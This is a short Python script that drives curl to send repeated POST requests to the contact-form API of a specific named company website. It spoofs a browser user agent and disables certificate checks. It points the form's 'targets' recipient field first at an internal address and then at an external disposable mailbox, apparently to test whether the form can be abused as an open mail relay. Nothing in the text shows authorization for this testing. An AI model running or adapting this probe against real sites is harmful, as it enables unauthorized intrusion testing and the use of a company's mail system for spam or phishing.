import subprocess, time
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
AT = chr(64)

def send(targets, extra=None):
    args = ["curl","-sk","-A",UA,"-X","POST","https://www.infinitycapital.bh/api/send",
            "-H","Content-Type: application/x-www-form-urlencoded",
            "--data-urlencode","targets="+targets]
    for k,v in {"fname":"probe","lname":"sec","areacode":"973","tel":"5551234",
                "cname":"qa","subject":"hello","msg":"body","check":"on"}.items():
        args += ["--data-urlencode",k+"="+v]
    if extra: args += extra
    args += ["-o","/tmp/o3.bin","-w","%{http_code}"]
    r=subprocess.run(args,capture_output=True,text=True)
    return r.stdout.strip()+"|"+open("/tmp/o3.bin","rb").read()[:220].decode("utf8","replace")

print("--- repeat internal 5x ---")
for i in range(5):
    print(i, send("sec"+AT+"infinitycapital.bh")); time.sleep(1)
print("--- repeat external 5x ---")
for i in range(5):
    print(i, send("probe"+AT+"mailinator.com")); time.sleep(1)
